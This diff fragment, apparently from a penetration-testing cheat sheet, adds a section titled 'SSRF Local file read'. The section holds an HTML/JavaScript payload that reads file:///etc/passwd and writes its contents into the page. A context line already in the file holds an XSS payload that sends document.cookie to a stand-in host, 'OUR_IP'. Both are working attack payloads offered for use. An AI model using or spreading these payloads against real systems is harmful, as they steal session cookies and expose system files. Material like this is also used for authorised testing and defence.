@@ -431,6 +431,18 @@ Try hosting our own script
 new Image().src = "http://OUR_IP/index.php?c=" + document.cookie;
 ```
 
+SSRF Local file read
+
+```html
+<script>
+	x=new XMLHttpRequest;
+	x.onload=function(){  
+	document.write(this.responseText)};
+	x.open("GET","file:///etc/passwd");
+	x.send();
+</script>
+```
+
 ---
 
 ## References
